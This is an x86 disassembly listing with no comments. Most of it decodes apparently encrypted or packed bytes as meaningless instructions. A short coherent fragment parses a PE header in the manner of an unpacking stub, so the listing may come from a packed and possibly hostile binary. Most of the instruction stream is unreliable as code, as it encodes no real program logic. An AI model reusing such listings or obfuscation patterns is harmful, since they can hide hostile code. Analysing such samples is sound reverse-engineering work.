  40f92f:	fstp   DWORD PTR [edx+0x5]
  40f932:	cmc    
  40f933:	mov    esp,db2
  40f936:	jp     0x40f961
  40f938:	ins    BYTE PTR es:[edi],dx
  40f939:	test   eax,0xce6b23a2
  40f93e:	or     edx,esi
  40f940:	fistp  DWORD PTR [esi-0x4cc0de6b]
  40f946:	mov    ch,0xf6
  40f948:	addr16 sub eax,0xfe6b6667
  40f94e:	fwait
  40f94f:	jne    0x40f961
  40f951:	jb     0x40f9bf
  40f953:	lea    ebp,[edx+esi*1-0x2c]
  40f957:	push   ecx
  40f958:	xchg   ecx,eax
  40f959:	fs icebp 
  40f95b:	mov    edi,0xbaffc35
  40f960:	or     BYTE PTR [ecx-0x12],ch
  40f963:	jne    0x40f944
  40f965:	push   0x3e
  40f967:	dec    edi
  40f968:	push   edx
  40f969:	jb     0x40f8f5
  40f96b:	jge    0x40f96e
  40f96d:	adc    al,0x55
  40f96f:	add    BYTE PTR [ebp+edi*2-0xf45fe0c],0xb2
  40f977:	pop    esi
  40f978:	leave  
  40f979:	add    dl,BYTE PTR fs:[edx+esi*2-0x14]
  40f97e:	lahf   
  40f97f:	in     al,dx
  40f980:	sbb    ebx,esp
  40f982:	fsub   QWORD PTR [ebx+0x57043241]
  40f988:	jmp    0x40f94c
  40f98a:	pushf  
  40f98b:	sti    
  40f98c:	mov    esp,0x6710e467
  40f991:	jo     0x40f91c
  40f993:	adc    BYTE PTR [esi+0x5d702c70],0xb6
  40f99a:	sub    BYTE PTR ds:0x67d87e71,cl
  40f9a0:	lods   al,BYTE PTR es:[esi]
  40f9a2:	mov    edx,0x8a0f75ed
  40f9a7:	js     0x40f9f1
  40f9a9:	hlt    
  40f9aa:	cwde   
  40f9ab:	in     eax,dx
  40f9ac:	xor    edi,DWORD PTR [esi]
  40f9ae:	jmp    0xdd7:0x9c1600eb
  40f9b5:	and    eax,DWORD PTR [ecx-0x45]
  40f9b8:	scas   eax,DWORD PTR es:[edi]
  40f9b9:	jl     0x40f978
  40f9bb:	dec    ebx
  40f9bc:	jb     0x40f9cd
  40f9be:	pop    ebp
  40f9bf:	xchg   edx,eax
  40f9c0:	mov    DWORD PTR [eax+edi*1-0x68],edx
  40f9c4:	retf   0x28ed
  40f9c7:	ror    DWORD PTR [esi+0x60974125],1
  40f9cd:	int    0xb9
  40f9cf:	cwde   
  40f9d0:	aaa    
  40f9d1:	shl    DWORD PTR [ebp+0xc],0xe0
  40f9d5:	xchg   ebp,eax
  40f9d6:	xchg   ebp,eax
  40f9d7:	ins    DWORD PTR es:[edi],dx
  40f9d8:	mov    bh,0xd6
  40f9da:	push   edx
  40f9db:	add    al,BYTE PTR [ebx+0x57]
  40f9de:	lods   eax,DWORD PTR ds:[esi]
  40f9df:	fcompp 
  40f9e1:	loop   0x40f9d4
  40f9e3:	pop    ecx
  40f9e4:	pop    esp
  40f9e5:	sar    BYTE PTR [edi],0x83
  40f9e8:	(bad)  
  40f9e9:	aaa    
  40f9ea:	xchg   esp,eax
  40f9eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9ec:	ficomp WORD PTR [ebp-0x21]
  40f9ef:	sbb    eax,0xd6b19b62
  40f9f4:	pop    ds
  40f9f5:	ds pop ss
  40f9f7:	xchg   edi,eax
  40f9f8:	outs   dx,DWORD PTR ds:[esi]
  40f9f9:	push   ebx
  40f9fa:	(bad)  
  40f9fb:	cmp    ah,BYTE PTR [edi]
  40f9fd:	mov    ah,ch
  40f9ff:	enter  0xc90b,0xc1
  40fa03:	cmp    al,0xe3
  40fa05:	mov    DWORD PTR [esi],ebp
  40fa07:	lock push es
  40fa09:	cld    
  40fa0a:	je     0x40fa22
  40fa0c:	mov    bh,0x4b
  40fa0e:	mov    ss,eax
  40fa10:	stos   BYTE PTR es:[edi],al
  40fa11:	(bad)  
  40fa12:	sbb    eax,0x54ff0d7f
  40fa17:	aas    
  40fa18:	outs   dx,DWORD PTR ds:[esi]
  40fa19:	jne    0x40fa81
  40fa1b:	jmp    0x79b3:0x66c3eaaf
  40fa22:	cmp    eax,0x6233196e
  40fa27:	pop    es
  40fa28:	fsub   QWORD PTR [esi-0x6228376]
  40fa2e:	cmp    al,0x81
  40fa30:	loop   0x40f9ba
  40fa32:	cmc    
  40fa33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa34:	xor    al,0xd7
  40fa36:	and    al,0xb5
  40fa38:	ret    
  40fa39:	into   
  40fa3a:	ret    
  40fa3b:	lods   eax,DWORD PTR ds:[esi]
  40fa3c:	ds dec eax
  40fa3e:	fs pushf 
  40fa40:	dec    edi
  40fa41:	shr    BYTE PTR [ebp+0x29fdfc70],1
  40fa47:	repz xor al,0xde
  40fa4a:	dec    esp
  40fa4b:	and    BYTE PTR [edx],0x78
  40fa4e:	sub    BYTE PTR [eax+0x3efbe1f6],dl
  40fa54:	(bad)  
  40fa55:	outs   dx,DWORD PTR ds:[si]
  40fa57:	idiv   BYTE PTR [ebx-0x5f669e43]
  40fa5d:	sbb    eax,0xb06ed158
  40fa62:	ss dec esi
  40fa64:	mov    ebx,0xce183343
  40fa69:	jl     0x40fac3
  40fa6b:	std    
  40fa6c:	push   esp
  40fa6d:	neg    DWORD PTR [ebp-0x79061c72]
  40fa73:	fist   DWORD PTR [eax-0xe0aa681]
  40fa79:	cld    
  40fa7a:	mov    eax,0xd0121a6d
  40fa7f:	popa   
  40fa80:	pop    es
  40fa81:	mov    edi,0xf645cee2
  40fa86:	(bad)  
  40fa87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa88:	shr    BYTE PTR [eax-0x1d],cl
  40fa8b:	and    ch,dh
  40fa8d:	sar    DWORD PTR [ebx+0x5d882f85],0x49
  40fa94:	and    DWORD PTR [esp+esi*2+0x7d12e3c1],0x70497e92
  40fa9f:	lds    bp,DWORD PTR [edi-0x1252db9b]
  40faa6:	hlt    
  40faa7:	dec    esi
  40faa8:	and    al,0xf1
  40faaa:	adc    cl,0x66
  40faad:	out    0xab,al
  40faaf:	sahf   
  40fab0:	cdq    
  40fab1:	add    esi,DWORD PTR [ecx]
  40fab3:	xchg   edi,eax
  40fab4:	jmp    0x40fb2f
  40fab6:	sbb    al,0x6d
  40fab8:	mov    ecx,0x9802d135
  40fabd:	test   al,0xe0
  40fabf:	jo     0x40fa5e
  40fac1:	nop
  40fac2:	push   0xffffffeb
  40fac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fac5:	outs   dx,BYTE PTR ds:[esi]
  40fac6:	scas   eax,DWORD PTR es:[edi]
  40fac7:	retf   0xf088
  40faca:	mov    dh,BYTE PTR [edi]
  40facc:	add    eax,0xd0e51d3d
  40fad1:	les    esp,FWORD PTR [edi-0x7af0aeac]
  40fad7:	push   edx
  40fad8:	loop   0x40fac3
  40fada:	ret    0xe905
  40fadd:	xor    bl,BYTE PTR [esi]
  40fadf:	or     DWORD PTR ds:0x91a598ea,0xffffffee
  40fae6:	inc    edi
  40fae7:	ja     0x40faa1
  40fae9:	leave  
  40faea:	inc    edx
  40faeb:	adc    eax,DWORD PTR [edx-0x44191b1c]
  40faf1:	or     DWORD PTR [edx],edi
  40faf3:	stc    
  40faf4:	mov    ?,WORD PTR [ebx-0x6d]
  40faf7:	repnz call 0xa275:0xee953151
  40faff:	xchg   BYTE PTR [ebx],ch
  40fb01:	mov    bl,0x8d
  40fb03:	pop    esi
  40fb04:	push   esp
  40fb05:	sbb    esp,ebx
  40fb07:	shr    al,cl
  40fb09:	lods   eax,DWORD PTR ds:[esi]
  40fb0a:	inc    ebp
  40fb0b:	out    dx,eax
  40fb0c:	fldenv [edi]
  40fb0e:	pusha  
  40fb0f:	push   ecx
  40fb10:	adc    BYTE PTR [edi-0x61],bh
  40fb13:	jmp    0x7067:0xe291d65
  40fb1a:	ret    0x336f
  40fb1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1e:	sbb    dl,BYTE PTR [ebx+ecx*2]
  40fb21:	cld    
  40fb22:	bound  esi,QWORD PTR [edi+0x41c8c923]
  40fb28:	fiadd  DWORD PTR [eax+0x32]
  40fb2b:	jmp    0x8173:0xad74b65c
  40fb32:	popf   
  40fb33:	pusha  
  40fb34:	fsubr  DWORD PTR [eax]
  40fb36:	xor    eax,0x6006aa0a
  40fb3b:	int3   
  40fb3c:	fcomp  DWORD PTR [eax+0x3be3da57]
  40fb42:	and    BYTE PTR [ecx-0x6d],ch
  40fb45:	sub    al,0xc5
  40fb47:	scas   al,BYTE PTR es:[edi]
  40fb48:	imul   dx,WORD PTR [ebp+ebx*4+0x7e5e91ba],0xff82
  40fb51:	or     al,0xd0
  40fb53:	jle    0x40fb9a
  40fb55:	xchg   edi,eax
  40fb56:	sbb    al,0x2
  40fb58:	frstor [eax+eax*8+0x16b4dd01]
  40fb5f:	mov    dl,0x1a
  40fb61:	mov    ebp,DWORD PTR [edi]
  40fb63:	xor    ah,bl
  40fb65:	stos   DWORD PTR es:[edi],eax
  40fb66:	inc    ecx
  40fb67:	or     DWORD PTR [edi+0x30],0x14f5014b
  40fb6e:	cli    
  40fb6f:	ins    DWORD PTR es:[edi],dx
  40fb70:	sbb    al,al
  40fb72:	fs push edx
  40fb74:	ss mov dl,0x65
  40fb77:	inc    edx
  40fb78:	lods   eax,DWORD PTR ds:[esi]
  40fb79:	mov    edi,0x746137de
  40fb7e:	mov    bh,0x94
  40fb80:	jmp    0x45423eda
  40fb85:	aam    0xfc
  40fb87:	pop    edi
  40fb88:	jg     0x40fb41
  40fb8a:	dec    ebx
  40fb8b:	cmp    bh,ch
  40fb8d:	and    al,0x5a
  40fb8f:	sahf   
  40fb90:	mov    ds:0x800d76d6,eax
  40fb95:	jg     0x40fbf4
  40fb97:	mov    esi,0xf751b00c
  40fb9c:	sbb    eax,0x42e0a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xd0
  40fbb3:	sub    bl,ch
  40fbb5:	adc    al,BYTE PTR [edx-0x5c8f8f4f]
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb40
  40fbbf:	push   ecx
  40fbc0:	jns    0x40fb5f
  40fbc2:	adc    dl,BYTE PTR [ecx+ebp*8+0x76]
  40fbc6:	out    dx,eax
  40fbc7:	enter  0x77af,0x6b
  40fbcb:	mov    ecx,0x5e5e5b64
  40fbd0:	xor    eax,0xc2b9f0ac
  40fbd5:	sar    edx,cl
  40fbd7:	push   ecx
  40fbd8:	fucomi st,st(5)
  40fbda:	sbb    DWORD PTR [edx],ecx
  40fbdc:	(bad)  
  40fbde:	xchg   edi,eax
  40fbdf:	add    al,0x76
  40fbe1:	add    BYTE PTR [esi-0x43701717],cl
  40fbe7:	xor    ecx,DWORD PTR [ebx]
  40fbe9:	dec    esi
  40fbea:	sbb    al,0x4a
  40fbec:	lods   eax,DWORD PTR ds:[esi]
  40fbed:	fidiv  WORD PTR [edi+0x45d99d5a]
  40fbf3:	mov    bl,0x1d
  40fbf5:	mov    bh,ch
  40fbf7:	ins    BYTE PTR es:[edi],dx
  40fbf8:	adc    al,BYTE PTR [edi+0x66759361]
  40fbfe:	aas    
  40fbff:	adc    DWORD PTR [ebx-0x66fa1a19],eax
  40fc05:	mov    al,ds:0x77abad7f
  40fc0a:	pop    ebp
  40fc0b:	mov    ecx,ebx
  40fc0d:	neg    ecx
  40fc0f:	mov    ecx,0x23fc9e61
  40fc14:	cli    
  40fc15:	dec    ebx
  40fc16:	idiv   DWORD PTR [esi-0x28]
  40fc19:	jg     0x40fc09
  40fc1b:	mov    BYTE PTR [ecx+edi*8],ch
  40fc1e:	retf   
  40fc1f:	mov    ?,WORD PTR [ecx]
  40fc21:	mov    cl,0xf
  40fc23:	sbb    eax,0x46907b73
  40fc28:	gs push ds
  40fc2a:	jno    0x40fbcb
  40fc2c:	lahf   
  40fc2d:	adc    ebx,esi
  40fc2f:	daa    
  40fc30:	stos   DWORD PTR es:[edi],eax
  40fc31:	xor    DWORD PTR ds:[ecx],esp
  40fc34:	(bad)  
  40fc36:	rcl    DWORD PTR [edi],cl
  40fc38:	enter  0x3977,0x24
  40fc3c:	inc    DWORD PTR [ebx-0x76]
  40fc3f:	jmp    0x331cb3e4
  40fc44:	dec    eax
  40fc45:	lds    eax,FWORD PTR [ecx+ebp*2+0x27]
  40fc49:	push   0x55359e47
  40fc4e:	repz or BYTE PTR [edi+0x1b64e5c4],cl
  40fc55:	and    DWORD PTR [edi],ebx
  40fc57:	call   0xa539c24b
  40fc5c:	scas   eax,DWORD PTR es:[edi]
  40fc5d:	sub    edx,DWORD PTR [ebx+0x66245db8]
  40fc63:	add    al,0xf6
  40fc65:	out    dx,eax
  40fc66:	(bad)  
  40fc67:	scas   eax,DWORD PTR es:[edi]
  40fc68:	and    ch,ch
  40fc6a:	int    0x85
  40fc6c:	mov    esp,0x2188b9fa
  40fc71:	cmp    BYTE PTR [eax],cl
  40fc73:	sub    al,0x2c
  40fc75:	cmp    BYTE PTR [esi],dh
  40fc77:	add    esp,DWORD PTR [edx]
  40fc79:	test   BYTE PTR [ebp-0xd7efa76],dh
  40fc7f:	mov    ds:0x3a6f1942,eax
  40fc84:	sahf   
  40fc85:	cmp    al,0x92
  40fc87:	cdq    
  40fc88:	xchg   edx,eax
  40fc89:	inc    ebp
  40fc8a:	and    ch,0x35
  40fc8d:	repnz das 
  40fc8f:	mov    cl,0x79
  40fc91:	cmp    BYTE PTR [edx],bh
  40fc93:	push   esp
  40fc94:	les    esi,FWORD PTR [ebx-0x136403ec]
  40fc9a:	or     BYTE PTR [ebp-0x59c8acc8],ah
  40fca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fca1:	popf   
  40fca2:	(bad)  
  40fca3:	dec    eax
  40fca4:	cli    
  40fca5:	cmp    ch,BYTE PTR [ebx+0x6d377ff6]
  40fcab:	jne    0x40fccc
  40fcad:	scas   eax,DWORD PTR es:[edi]
  40fcae:	xor    eax,0x45eaec0f
  40fcb3:	sbb    ebp,DWORD PTR [esi+edx*4+0x68]
  40fcb7:	push   ebp
  40fcb8:	mov    dh,0x74
  40fcba:	scas   eax,DWORD PTR es:[edi]
  40fcbb:	out    0x76,eax
  40fcbd:	ins    BYTE PTR es:[edi],dx
  40fcbe:	cld    
  40fcbf:	dec    edx
  40fcc0:	add    edi,DWORD PTR [ebp+0x29]
  40fcc3:	imul   ebp,eax,0x39
  40fcc6:	lods   eax,DWORD PTR ss:[esi]
  40fcc8:	dec    ebx
  40fcc9:	nop
  40fcca:	in     al,0x4b
  40fccc:	daa    
  40fccd:	je     0x40fc88
  40fccf:	and    al,0xa4
  40fcd1:	call   0x99cafa4a
  40fcd6:	mov    ch,0x9
  40fcd8:	inc    esi
  40fcd9:	fst    QWORD PTR [ebx]
  40fcdb:	jmp    0x40fc71
  40fcdd:	js     0x40fd58
  40fcdf:	mov    cs,edi
  40fce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce2:	ret    
  40fce3:	push   ebx
  40fce4:	inc    edi
  40fce5:	push   ds
  40fce6:	mov    ds:0xf8b58959,eax
  40fceb:	in     eax,dx
  40fcec:	(bad)  
  40fced:	cmp    BYTE PTR [esi-0x4d9787e],dh
  40fcf3:	call   0xcae551a
  40fcf8:	jo     0x40fcf9
  40fcfa:	das    
  40fcfb:	dec    edx
  40fcfc:	mul    DWORD PTR [esi+edi*8]
  40fcff:	push   ecx
  40fd00:	dec    esi
  40fd01:	ffreep st(4)
  40fd03:	inc    esp
  40fd04:	dec    esp
  40fd05:	mov    BYTE PTR [ecx+0x4c],bh
  40fd08:	test   BYTE PTR [ebp-0x20],bh
  40fd0b:	jg     0x40fcdd
  40fd0d:	iret   
  40fd0e:	or     DWORD PTR [ecx+0x7e],0xffffffd0
  40fd12:	lods   eax,DWORD PTR ds:[esi]
  40fd13:	cmp    eax,0xad3d3f52
  40fd18:	lea    esp,[ebp-0x56]
  40fd1b:	ret    
  40fd1c:	sub    ecx,DWORD PTR [ecx-0x658939ec]
  40fd22:	xlat   BYTE PTR es:[ebx]
  40fd24:	or     BYTE PTR [edx-0xe6e58d5],bh
  40fd2a:	sbb    eax,0x8a05ff58
  40fd2f:	repnz call 0xf00e:0x5d4ec82
  40fd37:	sbb    al,0xe
  40fd39:	dec    esp
  40fd3a:	and    BYTE PTR [ebp+0x7d],ch
  40fd3d:	add    esi,DWORD PTR [esi+0x23]
  40fd40:	adc    BYTE PTR [eax-0x65],dh
  40fd43:	cmp    BYTE PTR [ebx+0x2bb02324],al
  40fd49:	call   0x898c:0xf5724419
  40fd50:	ja     0x40fce9
  40fd52:	aam    0xba
  40fd54:	dec    ecx
  40fd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd56:	push   es
  40fd57:	sahf   
  40fd58:	aas    
  40fd59:	aaa    
  40fd5a:	test   DWORD PTR [ecx+edi*1],esp
  40fd5d:	mov    bh,0x32
  40fd5f:	jns    0x40fdd3
  40fd61:	jae    0x40fd45
  40fd63:	out    0xc2,al
  40fd65:	in     al,dx
  40fd66:	int3   
  40fd67:	fistp  WORD PTR [ecx+0x5a64abfc]
  40fd6d:	das    
  40fd6e:	mov    dh,0x86
  40fd70:	enter  0x3375,0xa
  40fd74:	xor    al,0xe4
  40fd76:	adc    esp,DWORD PTR [edi]
  40fd78:	and    BYTE PTR [ebp+0xa],bh
  40fd7b:	imul   esp,DWORD PTR [edi],0xb875b435
  40fd81:	jae    0x40fdf6
  40fd83:	cmp    ecx,edx
  40fd85:	inc    bp
  40fd87:	sbb    eax,0xa8ad0e56
  40fd8c:	dec    ebp
  40fd8d:	dec    ecx
  40fd8e:	and    al,0x46
  40fd90:	xchg   esi,eax
  40fd91:	and    al,0x57
  40fd93:	adc    ch,bh
  40fd95:	or     cl,BYTE PTR [esi-0x73d01039]
  40fd9b:	test   DWORD PTR [edx],0x3dfc1134
  40fda1:	in     al,dx
  40fda2:	sub    al,0xe5
  40fda4:	add    bh,BYTE PTR [ecx-0x717e5919]
  40fdaa:	mov    bh,BYTE PTR [ecx-0x418a88e7]
  40fdb0:	sub    al,0x53
  40fdb2:	(bad)  
  40fdb3:	loopne 0x40fe03
  40fdb5:	scas   al,BYTE PTR es:[edi]
  40fdb6:	pushf  
  40fdb7:	icebp  
  40fdb8:	and    ch,ah
  40fdba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdbb:	jl     0x40fd62
  40fdbd:	mov    al,ds:0x21fcbd4e
  40fdc2:	je     0x40fdca
  40fdc4:	mov    ecx,0xb70c4c59
  40fdc9:	addr16 addr16 test al,0x58
  40fdcd:	inc    eax
  40fdce:	xchg   ecx,eax
  40fdcf:	sbb    bh,ch
  40fdd1:	jnp    0x40fd8c
  40fdd3:	add    eax,0x6baf5f8e
  40fdd8:	push   ss
  40fdd9:	ja     0x40fe08
  40fddb:	mov    eax,0xfab68e90
  40fde0:	mov    esi,ebp
  40fde2:	adc    eax,0x40e9b9aa
  40fde7:	js     0x40fdbd
  40fde9:	xchg   ebp,eax
  40fdea:	dec    edx
  40fdeb:	fwait
  40fdec:	push   ebp
  40fded:	jo     0x40fe64
  40fdef:	xchg   esp,eax
  40fdf0:	clc    
  40fdf1:	cdq    
  40fdf2:	add    esp,0xc3133725
  40fdf8:	ins    BYTE PTR es:[edi],dx
  40fdf9:	arpl   WORD PTR [ebx],si
  40fdfb:	(bad)  
  40fdfc:	ja     0x40fdc5
  40fdfe:	jecxz  0x40fe18
  40fe00:	nop
  40fe01:	nop    DWORD PTR [eax-0x5b03b2a1]
  40fe08:	or     eax,0x4a2f5b63
  40fe0d:	mov    bh,0x43
  40fe0f:	adc    eax,0x19271378
  40fe14:	std    
  40fe15:	pusha  
  40fe16:	enter  0x780,0x5a
  40fe1a:	add    BYTE PTR [ebx-0x7480b166],bl
  40fe20:	std    
  40fe21:	sbb    DWORD PTR [esi+edx*8+0x5d],ebx
  40fe25:	jmp    0x40fe2c
  40fe27:	lods   eax,DWORD PTR ds:[esi]
  40fe28:	add    eax,eax
  40fe2a:	jmp    0xc2b2:0xf759e360
  40fe31:	fisub  DWORD PTR [edx+0x54]
  40fe34:	(bad)  
  40fe35:	jmp    0x4997:0x20986c32
  40fe3c:	mov    esp,0xc3819d6e
  40fe41:	fist   DWORD PTR [edx]
  40fe43:	int    0x4a
  40fe45:	sbb    al,0xc1
  40fe47:	cmp    eax,0x530efab5
  40fe4c:	cmp    BYTE PTR [ecx+eax*2-0x2bbe1482],cl
  40fe53:	dec    eax
  40fe54:	xor    al,0xe7
  40fe56:	loope  0x40fddd
  40fe58:	pop    esp
  40fe59:	xlat   BYTE PTR ds:[ebx]
  40fe5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe5b:	les    esp,FWORD PTR [edx-0x71576ee5]
  40fe61:	mov    esp,0x77f962eb
  40fe66:	fldenv [esi-0x4ae99ec6]
  40fe6c:	mov    bh,0x4b
  40fe6e:	add    ah,0x20
  40fe71:	idiv   BYTE PTR [ecx-0xbe2f4d2]
  40fe77:	imul   edx,DWORD PTR [esi-0x68],0xffffffde
  40fe7b:	xchg   DWORD PTR [ebp-0x5d930d96],ebx
  40fe81:	or     DWORD PTR [esi+0x7d2a4715],0x40
  40fe88:	push   0x4f58d13d
  40fe8d:	ins    BYTE PTR es:[edi],dx
  40fe8e:	aaa    
  40fe8f:	mov    ah,0x7b
  40fe91:	mov    ds:0xb93f19cc,al
  40fe96:	in     al,0xbb
  40fe98:	sub    eax,0xc42e4162
  40fe9d:	rcr    DWORD PTR [esi-0x6c],0x9b
  40fea1:	push   ebp
  40fea2:	jnp    0x40fe5a
  40fea4:	and    esp,DWORD PTR [edx]
  40fea6:	pop    ss
  40fea7:	sbb    al,dh
  40fea9:	rol    DWORD PTR [edi],0x63
  40feac:	lods   al,BYTE PTR ds:[esi]
  40fead:	inc    edi
  40feae:	ins    BYTE PTR es:[edi],dx
  40feaf:	xchg   ecx,eax
  40feb0:	pop    edx
  40feb1:	mov    edx,0xb9deadc0
  40feb6:	std    
  40feb7:	out    0x67,eax
  40feb9:	test   al,0x46
  40febb:	jmp    0x1403:0x68f49464
  40fec2:	stos   BYTE PTR es:[edi],al
  40fec3:	push   esp
  40fec4:	adc    al,BYTE PTR [eax]
  40fec6:	fst    DWORD PTR [eax]
  40fec8:	sub    edx,ecx
  40feca:	mov    al,ds:0xf06f4dcc
  40fecf:	dec    ebx
  40fed0:	mov    ebx,esi
  40fed2:	and    dl,BYTE PTR [ebx+0x73]
  40fed5:	out    0xda,eax
  40fed7:	loop   0x40fe9a
  40fed9:	push   ds
  40feda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fedb:	inc    esi
  40fedc:	dec    esi
  40fedd:	xchg   edx,eax
  40fede:	dec    ecx
  40fedf:	mov    dl,0x83
  40fee1:	xchg   esi,eax
  40fee2:	scas   eax,DWORD PTR es:[edi]
  40fee3:	ret    
  40fee4:	test   al,0xc1
  40fee6:	push   edi
  40fee7:	in     eax,dx
  40fee8:	jl     0x40feac
  40feea:	leave  
  40feeb:	vmwrite ecx,DWORD PTR [ecx]
  40feee:	jmp    0x1530:0xea71795
  40fef5:	mov    al,0x23
  40fef7:	popf   
  40fef8:	sti    
  40fef9:	pop    esi
  40fefa:	push   cs
  40fefb:	sbb    ch,BYTE PTR [ebx+0xd30d96a]
  40ff01:	fcomi  st,st(2)
  40ff03:	test   dh,ch
  40ff05:	adc    ch,BYTE PTR [eax-0x47]
  40ff08:	mov    ds:0xc5bdee4e,eax
  40ff0d:	call   0xdd38:0x6a305c6d
  40ff14:	pop    esi
  40ff15:	nop
  40ff16:	push   0xb
  40ff18:	inc    esi
  40ff19:	jle    0x40ff29
  40ff1b:	fcom   DWORD PTR [edx]
  40ff1d:	dec    eax
  40ff1e:	push   ebp
  40ff1f:	imul   ebp,esp,0xf430d2ab
  40ff25:	not    BYTE PTR [edx]
  40ff27:	test   al,0x9e
  40ff29:	jp     0x40feb0
  40ff2b:	out    0x6,eax
  40ff2d:	inc    ebx
  40ff2e:	loope  0x40ff65
  40ff30:	mov    ebp,0x4d844284
  40ff35:	push   0xdb8f7b2b
  40ff3a:	mov    bh,0x6e
  40ff3c:	imul   ebx,DWORD PTR ds:0xdf84f02,0xd0193333
  40ff46:	in     al,0xc
  40ff48:	or     eax,0x1f7f4ac4
  40ff4d:	aaa    
  40ff4e:	jecxz  0x40ff62
  40ff50:	fld    QWORD PTR [eax-0x44]
  40ff53:	sbb    DWORD PTR [esi+ebp*8-0x80],0x296fb0de
  40ff5b:	pop    ds
  40ff5c:	dec    edx
  40ff5d:	dec    DWORD PTR [edx-0x58]
  40ff60:	sub    BYTE PTR ds:0x3ff3aaae,cl
  40ff66:	sbb    al,0xc8
  40ff68:	jmp    0x31fc:0x45c72eb9
  40ff6f:	test   DWORD PTR [eax+edi*8-0x75f7ba75],ebx
  40ff76:	add    bh,al
  40ff78:	add    eax,0x42e0b4
  40ff7d:	cmp    bh,BYTE PTR [edx]
  40ff7f:	add    BYTE PTR [eax],al
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e677,0x42fcfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fc51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fcf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e67b
  40ffb0:	mov    DWORD PTR ds:0x42fcf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e683,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	xchg   esi,eax
  40ffdd:	ds dec eax
  40ffdf:	push   0x7070bd35
  40ffe4:	mov    ds:0xbc70707d,eax
  40ffe9:	adc    ecx,esi
  40ffeb:	in     eax,0x85
  40ffed:	cmp    esi,ecx
  40ffef:	jae    0x410017
  40fff1:	(bad)  
  40fff2:	mov    ds:0x67f814ec,al
  40fff7:	in     al,dx
  40fff8:	pusha  
  40fff9:	mov    edx,0x8a5d3ee7
  40fffe:	cmp    ebp,edi
  410000:	scas   al,BYTE PTR es:[edi]
  410001:	fnsave [eax]
  410003:	add    al,0xfd
  410005:	and    eax,0x23a5ec7d
  41000a:	fisubr DWORD PTR [edi+esi*1-0x40289a81]
  410011:	js     0x40ffdc
  410013:	ficomp WORD PTR [ebx+edx*1+0x6]
  410017:	xor    ebp,ebp
  410019:	xchg   BYTE PTR [edx+0x489d71f2],al
  41001f:	jne    0x41008e
  410021:	push   ebp
  410022:	int3   
  410023:	adc    esp,eax
  410025:	popf   
  410026:	sbb    DWORD PTR [edi-0x5779d22c],ecx
  41002c:	mov    WORD PTR [eax-0x2112a186],ds
  410032:	sbb    eax,0xace83bde
  410037:	adc    eax,0xc3542d2c
  41003c:	out    0x42,al
  41003e:	sti    
  41003f:	pop    ecx
  410040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410042:	dec    esi
  410043:	stos   DWORD PTR es:[edi],eax
  410044:	add    bh,BYTE PTR [eax+eax*2]
  410047:	jge    0x4100af
  410049:	mov    ch,0xea
  41004b:	mov    esi,0x8174b8a7
  410050:	daa    
  410051:	sub    BYTE PTR [edi-0x422b3008],0x14
  410058:	jge    0x410026
  41005a:	or     esi,DWORD PTR [eax+eiz*4+0x19]
  41005e:	jmp    0x2176:0x233f3e7b
  410065:	jno    0x410039
  410067:	jmp    0xe783e7c5
  41006c:	mov    ebx,0xe41aa7cd
  410071:	popf   
  410072:	sub    DWORD PTR [edx],ecx
  410074:	pop    ebx
  410075:	add    esp,DWORD PTR [ecx-0x3c]
  410078:	cmp    DWORD PTR [esi+0x4a],0x48
  41007c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41007d:	inc    esp
  41007e:	xor    al,0xb
  410080:	adc    al,0x94
  410082:	mov    al,ds:0x8f8ee017
  410087:	(bad)  
  410088:	cmp    eax,0x824ff418
  41008d:	xchg   ecx,eax
  41008e:	or     esp,ebp
  410090:	test   eax,0xc8e4e23
  410095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410096:	retf   
  410097:	ins    BYTE PTR es:[edi],dx
  410098:	jbe    0x4100f4
  41009a:	lods   eax,DWORD PTR ds:[esi]
  41009b:	adc    bh,BYTE PTR [ebx+ebp*2+0x17b7bfc0]
  4100a2:	and    ebx,ebp
  4100a4:	frstor [edx]
  4100a6:	dec    ecx
  4100a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100a8:	(bad)  
  4100a9:	in     eax,dx
  4100aa:	xchg   edi,eax
  4100ab:	lock leave 
  4100ad:	mov    eax,0xd3f49c02
  4100b2:	push   edi
  4100b3:	bound  ebx,QWORD PTR [edi]
  4100b5:	push   cs
  4100b6:	sbb    al,0x1
  4100b8:	push   esp
  4100b9:	jg     0x410113
  4100bb:	mov    al,ds:0x9dc794bd
  4100c0:	pop    ebx
  4100c1:	dec    edx
  4100c2:	into   
  4100c3:	dec    ebp
  4100c4:	jo     0x41013a
  4100c6:	loope  0x410109
  4100c8:	out    dx,al
  4100c9:	cdq    
